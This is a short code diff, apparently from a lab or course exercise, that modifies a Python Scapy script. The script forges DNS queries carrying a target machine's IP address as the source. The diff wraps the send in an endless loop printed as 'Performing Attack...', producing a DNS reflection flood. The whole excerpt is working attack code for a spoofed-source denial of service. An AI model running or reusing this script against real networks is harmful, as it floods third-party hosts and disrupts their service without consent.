@@ -16,6 +16,9 @@ dns_port    =   int(args.dns_port)
 #Send a DNS request in the name of WS2 so that WS2 gets a DNS response in port 5353
 ip      = IP(src= target_ip, dst= dns_ip)
 udp     = UDP(sport=RandShort(), dport= dns_port)
-dns     = DNS(rd=1,qd=DNSQR(qname="example.com"))
+dns     = DNS(rd=1,qd=DNSQR(qname="reflected.com"))
 packet  = ip/udp/dns
-send(packet)
+
+print("Performing Attack...")
+while(1):
+    send(packet, verbose=0)
